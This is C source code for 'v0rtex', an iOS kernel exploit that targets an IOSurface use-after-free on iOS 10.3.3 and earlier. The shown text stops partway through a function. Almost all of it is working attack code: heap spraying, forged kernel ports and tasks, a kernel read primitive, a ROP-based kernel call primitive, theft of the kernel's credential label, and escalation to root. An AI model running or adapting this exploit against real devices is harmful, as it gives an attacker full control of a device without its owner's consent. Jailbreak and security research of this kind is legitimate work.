// v0rtex
// Bug by Ian Beer, I suppose?
// Exploit by Siguza.

// Status quo:
// - Escapes sandbox, gets root and tfp0, should work on A7-A9 devices <=10.3.3.
// - Can call arbitrary kernel functions with up to 7 args via KCALL().
// - Relies heavily on userland derefs, but with mach_port_request_notification
//   you could register fakeport on itself thus leaking the address of the
//   entire 0x1000 block, which should give you enough scratch space. (TODO)
// - Relies on mach_zone_force_gc which was removed in iOS 11, but the same
//   effect should be achievable by continuously spraying through zones and
//   measuring how long it takes - garbag collection usually takes ages. :P

// Not sure what'll really become of this, but it's certainly not done yet.
// Pretty sure I'll leave iOS 11 to Ian Beer though, for the time being.
// Might also do a write-up at some point, once fully working.

#include <sched.h>              // sched_yield
#include <string.h>             // strerror, memset
#include <unistd.h>             // usleep, setuid, getuid
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>

#include "Utilities.h"

#define SIZEOF_TASK                                 0x550
#define OFFSET_TASK_ITK_SELF                        0xd8
#define OFFSET_TASK_ITK_REGISTERED                  0x2e8
#define OFFSET_TASK_BSD_INFO                        0x360
#define OFFSET_PROC_P_PID                           0x10
#define OFFSET_PROC_UCRED                           0x100
#define OFFSET_UCRED_CR_UID                         0x18
#define OFFSET_UCRED_CR_LABEL                       0x78
#define OFFSET_VM_MAP_HDR                           0x10
#define OFFSET_IPC_SPACE_IS_TASK                    0x28
#define OFFSET_REALHOST_SPECIAL                     0x10
#define OFFSET_IOUSERCLIENT_IPC                     0x9c
#define OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX     0x5b8

#define OFFSET(name) (RAW_OFFSET(name) + slide)


const uint64_t IOSURFACE_CREATE_SURFACE =  0;
const uint64_t IOSURFACE_SET_VALUE      =  9;
const uint64_t IOSURFACE_GET_VALUE      = 10;
const uint64_t IOSURFACE_DELETE_VALUE   = 11;

const uint32_t IKOT_TASK                = 2;

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,

    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,

    kOSSerializeEndCollection   = 0x80000000U,

    kOSSerializeMagic           = 0x000000d3U,
};

// IOKit cruft
typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
extern const mach_port_t kIOMasterPortDefault;
CFMutableDictionaryRef IOServiceMatching(const char *name) CF_RETURNS_RETAINED;
io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching CF_RELEASES_ARGUMENT);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *client);
kern_return_t IOServiceClose(io_connect_t client);
kern_return_t IOConnectCallStructMethod(mach_port_t connection, uint32_t selector, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
kern_return_t IOConnectCallAsyncStructMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint64_t *reference, uint32_t referenceCnt, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);

// Other unexported symbols
kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);

static const char *errstr(int r)
{
    return r == 0 ? "success" : strerror(r);
}

static uint32_t transpose(uint32_t val)
{
    uint32_t ret = 0;
    for(size_t i = 0; val > 0; i += 8)
    {
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}

static kern_return_t my_mach_zone_force_gc(host_t host)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
    } Request __attribute__((unused));
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_trailer_t trailer;
    } Reply __attribute__((unused));
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
    } __Reply __attribute__((unused));
#pragma pack()

    union {
        Request In;
        Reply Out;
    } Mess;

    Request *InP = &Mess.In;
    Reply *Out0P = &Mess.Out;

    InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = host;
    InP->Head.msgh_local_port = mig_get_reply_port();
    InP->Head.msgh_id = 221;
    InP->Head.msgh_reserved = 0;

    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
    {
        ret = Out0P->RetCode;
    }
    return ret;
}

static kern_return_t my_mach_port_get_context(task_t task, mach_port_name_t name, mach_vm_address_t *context)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        mach_port_name_t name;
    } Request __attribute__((unused));
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_vm_address_t context;
        mach_msg_trailer_t trailer;
    } Reply __attribute__((unused));
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_vm_address_t context;
    } __Reply __attribute__((unused));
#pragma pack()

    union {
        Request In;
        Reply Out;
    } Mess;

    Request *InP = &Mess.In;
    Reply *Out0P = &Mess.Out;

    InP->NDR = NDR_record;
    InP->name = name;
    InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = task;
    InP->Head.msgh_local_port = mig_get_reply_port();
    InP->Head.msgh_id = 3228;
    InP->Head.msgh_reserved = 0;

    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
    {
        ret = Out0P->RetCode;
    }
    if(ret == KERN_SUCCESS)
    {
        *context = Out0P->context;
    }
    return ret;
}

#ifdef __LP64__
    typedef struct
    {
        kptr_t prev;
        kptr_t next;
        kptr_t start;
        kptr_t end;
    } kmap_hdr_t;
#endif

typedef struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        uint32_t type;
        uint32_t pad;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            natural_t seqno;
            natural_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests;
    kptr_t ip_premsg;
    uint64_t  ip_context;
    natural_t ip_flags;
    natural_t ip_mscount;
    natural_t ip_srights;
    natural_t ip_sorights;
} kport_t;

typedef union
{
    struct {
        struct {
            kptr_t data;
            uint64_t pad      : 24,
                     type     :  8,
                     reserved : 32;
        } lock; // mutex lock
        uint32_t ref_count;
        uint32_t active;
        uint32_t halting;
        uint32_t pad;
        kptr_t map;
    } a;
    struct {
        char pad[OFFSET_TASK_ITK_SELF];
        kptr_t itk_self;
    } b;
    struct {
        char pad[OFFSET_TASK_BSD_INFO];
        kptr_t bsd_info;
    } c;
} ktask_t;

kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
{
    kern_return_t retval = KERN_FAILURE,
                  ret;
    task_t self = mach_task_self();
    host_t host = mach_host_self();

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    LOG("service: %x", service);
    if(!MACH_PORT_VALID(service))
    {
        goto out0;
    }

    io_connect_t client = MACH_PORT_NULL;
    ret = IOServiceOpen(service, self, 0, &client);
    LOG("client: %x, %s", client, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out0;
    }
    if(!MACH_PORT_VALID(client))
    {
        ret = KERN_FAILURE;
        goto out0;
    }

    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,

        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,
    };
    union
    {
        char _padding[0x3c8]; // XXX 0x6c8 for iOS 11
        struct
        {
            mach_vm_address_t addr1;
            mach_vm_address_t addr2;
            uint32_t id;
        } data;
    } surface;
    size_t size = sizeof(surface);
    ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), &surface, &size);
    LOG("newSurface: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out1;
    }

    mach_port_t realport = MACH_PORT_NULL;
    ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &realport);
    if(ret != KERN_SUCCESS)
    {
        LOG("mach_port_allocate: %s", mach_error_string(ret));
        goto out1;
    }
    if(!MACH_PORT_VALID(realport))
    {
        LOG("realport: %x", realport);
        ret = KERN_FAILURE;
        goto out1;
    }

#define NUM_BEFORE 0x1000
    mach_port_t before[NUM_BEFORE] = { MACH_PORT_NULL };
    for(size_t i = 0; i < NUM_BEFORE; ++i)
    {
        ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &before[i]);
        if(ret != KERN_SUCCESS)
        {
            LOG("mach_port_allocate: %s", mach_error_string(ret));
            goto out2;
        }
    }

    mach_port_t port = MACH_PORT_NULL;
    ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &port);
    if(ret != KERN_SUCCESS)
    {
        LOG("mach_port_allocate: %s", mach_error_string(ret));
        goto out2;
    }
    if(!MACH_PORT_VALID(port))
    {
        LOG("port: %x", port);
        ret = KERN_FAILURE;
        goto out2;
    }

#define NUM_AFTER 0x100
    mach_port_t after[NUM_AFTER] = { MACH_PORT_NULL };
    for(size_t i = 0; i < NUM_AFTER; ++i)
    {
        ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &after[i]);
        if(ret != KERN_SUCCESS)
        {
            LOG("mach_port_allocate: %s", mach_error_string(ret));
            goto out3;
        }
    }

    LOG("realport: %x", realport);
    LOG("port: %x", port);

    ret = _kernelrpc_mach_port_insert_right_trap(self, port, port, MACH_MSG_TYPE_MAKE_SEND);
    LOG("mach_port_insert_right: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

    // There seems to be some weird asynchronity with freeing on IOConnectCallAsyncStructMethod,
    // which sucks. To work around it, I register the port to be freed on my own task (thus increasing refs),
    // sleep after the connect call and register again, thus releasing the reference synchronously.
    ret = mach_ports_register(self, &port, 1);
    LOG("mach_ports_register: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

    uint64_t ref;
    uint64_t in[3] = { 0, 0x666, 0 };
    IOConnectCallAsyncStructMethod(client, 17, realport, &ref, 1, in, sizeof(in), NULL, NULL);
    IOConnectCallAsyncStructMethod(client, 17, port, &ref, 1, in, sizeof(in), NULL, NULL);

    LOG("herp derp");
    usleep(100000);

    sched_yield();
    ret = mach_ports_register(self, &client, 1); // gonna use that later
    LOG("mach_ports_register: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

    // Prevent cleanup
    mach_port_t fakeport = port;
    port = MACH_PORT_NULL;

    // Heapcraft
    /*for(size_t i = NUM_AFTER; i > 0; --i)
    {
        if(MACH_PORT_VALID(after[i - 1]))
        {
            _kernelrpc_mach_port_destroy_trap(self, after[i - 1]);
            after[i - 1] = MACH_PORT_NULL;
        }
    }
    for(size_t i = NUM_BEFORE; i > 0; --i)
    {
        if(MACH_PORT_VALID(before[i - 1]))
        {
            _kernelrpc_mach_port_destroy_trap(self, before[i - 1]);
            before[i - 1] = MACH_PORT_NULL;
        }
    }*/

#define DATA_SIZE 0x1000
    uint32_t dict[DATA_SIZE / sizeof(uint32_t) + 7] =
    {
        // Some header or something
        surface.data.id,
        0x0,

        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeArray | 2,

        kOSSerializeString | (DATA_SIZE - 1),
    };
    dict[DATA_SIZE / sizeof(uint32_t) + 5] = kOSSerializeEndCollection | kOSSerializeString | 4;

    // ipc.ports zone uses 0x3000 allocation chunks, but hardware page size before A9
    // is actually 0x1000, so references to our reallocated memory may be shifted
    // by (0x1000 % sizeof(kport_t))
    kport_t triple_kport =
    {
        .ip_lock =
        {
            .data = 0x0,
            .type = 0x11,
        },
        .ip_messages =
        {
            .port =
            {
                .waitq =
                {
                    .waitq_queue =
                    {
                        .next = 0x0,
                        .prev = 0x11,
                    }
                },
            },
        },
        .ip_nsrequest = 0x0,
        .ip_pdrequest = 0x11,
    };
    for(uintptr_t ptr = (uintptr_t)&dict[5], end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
    {
        *(volatile kport_t*)ptr = triple_kport;
    }

    sched_yield();
    for(size_t i = NUM_AFTER; i > 0; --i)
    {
        if(MACH_PORT_VALID(after[i - 1]))
        {
            _kernelrpc_mach_port_destroy_trap(self, after[i - 1]);
            after[i - 1] = MACH_PORT_NULL;
        }
    }
    for(size_t i = NUM_BEFORE; i > 0; --i)
    {
        if(MACH_PORT_VALID(before[i - 1]))
        {
            _kernelrpc_mach_port_destroy_trap(self, before[i - 1]);
            before[i - 1] = MACH_PORT_NULL;
        }
    }

    ret = my_mach_zone_force_gc(host);
    if(ret != KERN_SUCCESS)
    {
        LOG("mach_zone_force_gc: %s", mach_error_string(ret));
        goto out3;
    }

    for(uint32_t i = 0; i < 0x2000; ++i)
    {
        dict[DATA_SIZE / sizeof(uint32_t) + 6] = transpose(i);
        volatile kport_t *dptr = (kport_t*)&dict[5];
        for(size_t j = 0; j < DATA_SIZE / sizeof(kport_t); ++j)
        {
            dptr[j].ip_context = (dptr[j].ip_context & 0xffffffff) | ((uint64_t)(0x10000000 | i) << 32);
            dptr[j].ip_messages.port.pad = 0x20000000 | i;
            dptr[j].ip_lock.pad = 0x30000000 | i;
        }
        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
        if(ret != KERN_SUCCESS)
        {
            LOG("setValue(%u): %s", i, mach_error_string(ret));
            goto out3;
        }
    }

    uint64_t ctx = 0xffffffff;
    ret = my_mach_port_get_context(self, fakeport, &ctx);
    LOG("mach_port_get_context: 0x%016llx, %s", ctx, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

    uint32_t shift_mask = ctx >> 60;
    if(shift_mask < 1 || shift_mask > 3)
    {
        LOG("Invalid shift mask.");
        goto out3;
    }
    uint32_t shift_off = sizeof(kport_t) - (((shift_mask - 1) * 0x1000) % sizeof(kport_t));

    uint32_t idx = (ctx >> 32) & 0xfffffff;
    dict[DATA_SIZE / sizeof(uint32_t) + 6] = transpose(idx);
    uint32_t request[] =
    {
        // Same header
        surface.data.id,
        0x0,

        transpose(idx), // Key
        0x0, // Null terminator
    };
    kport_t kport =
    {
        .ip_bits = 0x80000000, // IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE
        .ip_references = 100,
        .ip_lock =
        {
            .type = 0x11,
        },
        .ip_messages =
        {
            .port =
            {
                .receiver_name = 1,
                .msgcount = MACH_PORT_QLIMIT_KERNEL,
                .qlimit = MACH_PORT_QLIMIT_KERNEL,
            },
        },
        .ip_srights = 99,
    };

    for(uintptr_t ptr = (uintptr_t)&dict[5] + shift_off, end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
    {
        *(volatile kport_t*)ptr = kport;
    }
    uint32_t dummy;
    size = sizeof(dummy);

    sched_yield();
    ret = IOConnectCallStructMethod(client, 11, request, sizeof(request), &dummy, &size);
    if(ret != KERN_SUCCESS)
    {
        LOG("deleteValue(%u): %s", idx, mach_error_string(ret));
        goto out3;
    }
    size = sizeof(dummy);
    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
    LOG("setValue(%u): %s", idx, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

    mach_port_t notify = MACH_PORT_NULL;
    ret = mach_port_request_notification(self, fakeport, MACH_NOTIFY_PORT_DESTROYED, 0, realport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify);
    LOG("mach_port_request_notification: %x, %s", notify, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

    uint32_t response[4 + (DATA_SIZE / sizeof(uint32_t))] = { 0 };
    size = sizeof(response);
    ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &size);
    LOG("getValue(%u): 0x%lx bytes, %s", idx, size, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }
    if(size < DATA_SIZE + 0x10)
    {
        LOG("Response too short.");
        goto out3;
    }

    uint32_t fakeport_off = -1;
    kptr_t realport_addr = 0;
    for(uintptr_t ptr = (uintptr_t)&response[4] + shift_off, end = (uintptr_t)&response[4] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
    {
        kptr_t val = ((volatile kport_t*)ptr)->ip_pdrequest;
        if(val)
        {
            fakeport_off = (uint32_t)(ptr - (uintptr_t)&response[4]);
            realport_addr = val;
            break;
        }
    }
    if(!realport_addr)
    {
        LOG("Failed to leak realport pointer");
        goto out3;
    }
    LOG("realport addr: " ADDR, realport_addr);

    ktask_t ktask;
    ktask.a.lock.data = 0x0;
    ktask.a.lock.type = 0x22;
    ktask.a.ref_count = 100;
    ktask.a.active = 1;
    ktask.b.itk_self = 1;
    ktask.c.bsd_info = 0;

    kport.ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
    kport.ip_kobject = (kptr_t)&ktask;

    for(uintptr_t ptr = (uintptr_t)&dict[5] + shift_off, end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
    {
        *(volatile kport_t*)ptr = kport;
    }
    size = sizeof(dummy);

    sched_yield();
    ret = IOConnectCallStructMethod(client, 11, request, sizeof(request), &dummy, &size);
    if(ret != KERN_SUCCESS)
    {
        LOG("deleteValue(%u): %s", idx, mach_error_string(ret));
        goto out3;
    }
    size = sizeof(dummy);
    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
    LOG("setValue(%u): %s", idx, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

#define KREAD(addr, buf, size) \
do \
{ \
    for(size_t i = 0; i < ((size) + sizeof(uint32_t) - 1) / sizeof(uint32_t); ++i) \
    { \
        ktask.c.bsd_info = (addr + i * sizeof(uint32_t)) - OFFSET_PROC_P_PID; \
        ret = pid_for_task(fakeport, (int*)((uint32_t*)(buf) + i)); \
        if(ret != KERN_SUCCESS) \
        { \
            LOG("pid_for_task: %s", mach_error_string(ret)); \
            goto out3; \
        } \
    } \
} while(0)

    kptr_t itk_space = 0;
    KREAD(realport_addr + ((uintptr_t)&kport.ip_receiver - (uintptr_t)&kport), &itk_space, sizeof(itk_space));
    LOG("itk_space: " ADDR, itk_space);

    kptr_t self_task = 0;
    KREAD(itk_space + OFFSET_IPC_SPACE_IS_TASK, &self_task, sizeof(self_task));
    LOG("self_task: " ADDR, self_task);

    kptr_t IOSurfaceRootUserClient_port = 0;
    KREAD(self_task + OFFSET_TASK_ITK_REGISTERED, &IOSurfaceRootUserClient_port, sizeof(IOSurfaceRootUserClient_port));
    LOG("IOSurfaceRootUserClient port: " ADDR, IOSurfaceRootUserClient_port);

    kptr_t IOSurfaceRootUserClient_addr = 0;
    KREAD(IOSurfaceRootUserClient_port + ((uintptr_t)&kport.ip_kobject - (uintptr_t)&kport), &IOSurfaceRootUserClient_addr, sizeof(IOSurfaceRootUserClient_addr));
    LOG("IOSurfaceRootUserClient addr: " ADDR, IOSurfaceRootUserClient_addr);

    kptr_t IOSurfaceRootUserClient_vtab = 0;
    KREAD(IOSurfaceRootUserClient_addr, &IOSurfaceRootUserClient_vtab, sizeof(IOSurfaceRootUserClient_vtab));
    LOG("IOSurfaceRootUserClient vtab: " ADDR, IOSurfaceRootUserClient_vtab);

    kptr_t slide = IOSurfaceRootUserClient_vtab - RAW_OFFSET(iosurfacerootuserclient_vtable);
    LOG("slide: " ADDR, slide);
    if((slide % 0x100000) != 0)
    {
        goto out3;
    }
    
    ret = mach_ports_register(self, NULL, 0);
    LOG("mach_ports_register: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

    kptr_t vtab[0x600 / sizeof(kptr_t)] = { 0 };
    KREAD(IOSurfaceRootUserClient_vtab, vtab, sizeof(vtab));
    printf("[INFO]: KREAD IOSurfaceRootUserClient_vtab success!\n");
    vtab[OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX / sizeof(kptr_t)] = (RAW_OFFSET(ROP_ADD_X0_X0_0x10) + slide);
    union
    {
        struct {
            // IOUserClient fields
            kptr_t vtab;
            uint32_t refs;
            uint32_t pad;
            // IOExternalTrap fields
            kptr_t obj;
            kptr_t func;
            uint32_t break_stuff; // idk wtf this field does, but it has to be zero or iokit_user_client_trap does some weird pointer mashing
        } a;
        struct {
            char pad[OFFSET_IOUSERCLIENT_IPC];
            int32_t __ipc;
        } b;
    } object;
    memset(&object, 0, sizeof(object));
    object.a.vtab = (kptr_t)&vtab;
    object.a.refs = 100;
    object.b.__ipc = 100;

    kport.ip_bits = 0x8000001d; // IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT
    kport.ip_kobject = (kptr_t)&object;

    for(uintptr_t ptr = (uintptr_t)&dict[5] + shift_off, end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
    {
        *(volatile kport_t*)ptr = kport;
    }
    size = sizeof(dummy);
#undef KREAD

    // we leak a ref on realport here
    sched_yield();
    printf("[INFO]: going to call IOConnectCallStructMethod (11)..\n");
    ret = IOConnectCallStructMethod(client, 11, request, sizeof(request), &dummy, &size);
    if(ret != KERN_SUCCESS)
    {
        LOG("deleteValue(%u): %s", idx, mach_error_string(ret));
        goto out3;
    }
    size = sizeof(dummy);
    printf("[INFO]: going to call IOConnectCallStructMethod (IOSURFACE_SET_VALUE)..\n");
    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
    LOG("setValue(%u): %s", idx, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

#define KCALL(addr, x0, x1, x2, x3, x4, x5, x6) \
( \
    object.a.obj = (kptr_t)(x0), \
    object.a.func = (kptr_t)(addr), \
    (kptr_t)IOConnectTrap6(fakeport, 0, (kptr_t)(x1), (kptr_t)(x2), (kptr_t)(x3), (kptr_t)(x4), (kptr_t)(x5), (kptr_t)(x6)) \
)
    kptr_t kernel_task_addr = 0;
    printf("[INFO]: going to do a KCALL to copyout kernel_task..\n");
    printf("[INFO]: RAW_OFFSET(copyout): %llx\n", RAW_OFFSET(copyout));
    printf("[INFO]: OFFSET(copyout): %llx\n", OFFSET(copyout));
    printf("[INFO]: RAW_OFFSET(kernel_task): %llx\n", RAW_OFFSET(kernel_task));
    printf("[INFO]: OFFSET(kernel_task): %llx\n", OFFSET(kernel_task));
    int r = (int)KCALL(OFFSET(copyout), OFFSET(kernel_task), &kernel_task_addr, sizeof(kernel_task_addr), 0, 0, 0, 0);
    LOG("kernel_task addr: " ADDR ", %s (%x)", kernel_task_addr, errstr(r), r);
    
    if(kernel_task_addr == 0x0) {
        ret = KERN_FAILURE;
         goto out0;
    }

    if(r != 0 || !kernel_task_addr)
    {
        goto out4;
    }

    kptr_t kernproc_addr = 0;
    printf("[INFO]: going to do a KCALL to copyout kernel_task + task bsd info..\n");
    r = (int)KCALL(OFFSET(copyout), kernel_task_addr + OFFSET_TASK_BSD_INFO, &kernproc_addr, sizeof(kernproc_addr), 0, 0, 0, 0);
    LOG("kernproc addr: " ADDR ", %s", kernproc_addr, errstr(r));
    if(r != 0 || !kernproc_addr)
    {
        goto out4;
    }

    kptr_t kern_ucred = 0;
    r = (int)KCALL(OFFSET(copyout), kernproc_addr + OFFSET_PROC_UCRED, &kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
    LOG("kern_ucred: " ADDR ", %s", kern_ucred, errstr(r));
    if(r != 0 || !kernproc_addr)
    {
        goto out4;
    }

    kptr_t self_proc = 0;
    r = (int)KCALL(OFFSET(copyout), self_task + OFFSET_TASK_BSD_INFO, &self_proc, sizeof(self_proc), 0, 0, 0, 0);
    LOG("self_proc: " ADDR ", %s", self_proc, errstr(r));
    if(r != 0 || !kernproc_addr)
    {
        goto out4;
    }

    kptr_t self_ucred = 0;
    r = (int)KCALL(OFFSET(copyout), self_proc + OFFSET_PROC_UCRED, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
    LOG("self_ucred: " ADDR ", %s", self_ucred, errstr(r));
    if(r != 0 || !kernproc_addr)
    {
        goto out4;
    }

    KCALL(OFFSET(bcopy), kern_ucred + OFFSET_UCRED_CR_LABEL, self_ucred + OFFSET_UCRED_CR_LABEL, sizeof(kptr_t), 0, 0, 0, 0);
    LOG("stole the kernel's cr_label");

    KCALL(OFFSET(bzero), self_ucred + OFFSET_UCRED_CR_UID, 12, 0, 0, 0, 0, 0);
    setuid(0); // update host port
    LOG("uid: %u", getuid());

    host_t realhost = mach_host_self();
    LOG("realhost: %x (host: %x)", realhost, host);

    ktask_t zm_task;
    zm_task.a.lock.data = 0x0;
    zm_task.a.lock.type = 0x22;
    zm_task.a.ref_count = 100;
    zm_task.a.active = 1;
    zm_task.b.itk_self = 1;
    r = (int)KCALL(OFFSET(copyout), OFFSET(zone_map), &zm_task.a.map, sizeof(zm_task.a.map), 0, 0, 0, 0);
    LOG("zone_map: " ADDR ", %s", zm_task.a.map, errstr(r));
    if(r != 0 || !zm_task.a.map)
    {
        goto out4;
    }

    ktask_t km_task;
    km_task.a.lock.data = 0x0;
    km_task.a.lock.type = 0x22;
    km_task.a.ref_count = 100;
    km_task.a.active = 1;
    km_task.b.itk_self = 1;
    r = (int)KCALL(OFFSET(copyout), OFFSET(kernel_map), &km_task.a.map, sizeof(km_task.a.map), 0, 0, 0, 0);
    LOG("kernel_map: " ADDR ", %s", km_task.a.map, errstr(r));
    if(r != 0 || !km_task.a.map)
    {
        goto out4;
    }

    kptr_t ipc_space_kernel = 0;
    r = (int)KCALL(OFFSET(copyout), IOSurfaceRootUserClient_port + ((uintptr_t)&kport.ip_receiver - (uintptr_t)&kport), &ipc_space_kernel, sizeof(ipc_space_kernel), 0, 0, 0, 0);
    LOG("ipc_space_kernel: " ADDR ", %s", ipc_space_kernel, errstr(r));
    if(r != 0 || !ipc_space_kernel)
    {
        goto out4;
    }

#ifdef __LP64__
    kmap_hdr_t zm_hdr = { 0 };
    r = (int)KCALL(OFFSET(copyout), zm_task.a.map + OFFSET_VM_MAP_HDR, &zm_hdr, sizeof(zm_hdr), 0, 0, 0, 0);
    LOG("zm_range: " ADDR "-" ADDR ", %s", zm_hdr.start, zm_hdr.end, errstr(r));
    if(r != 0 || !zm_hdr.start || !zm_hdr.end)
    {
        goto out4;
    }
    if(zm_hdr.end - zm_hdr.start > 0x100000000)
    {
        LOG("zone_map is too big, sorry.");
        goto out4;
    }
    kptr_t zm_tmp; // macro scratch space
#   define ZM_FIX_ADDR(addr) \
    ( \
        zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff), \
        zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
    )
#else
#   define ZM_FIX_ADDR(addr) (addr)
#endif

    kptr_t ptrs[2] = { 0 };
    ptrs[0] = ZM_FIX_ADDR(KCALL(OFFSET(ipc_port_alloc_special), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    ptrs[1] = ZM_FIX_ADDR(KCALL(OFFSET(ipc_port_alloc_special), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    LOG("zm_port addr: " ADDR, ptrs[0]);
    LOG("km_port addr: " ADDR, ptrs[1]);

    KCALL(OFFSET(ipc_kobject_set), ptrs[0], (kptr_t)&zm_task, IKOT_TASK, 0, 0, 0, 0);
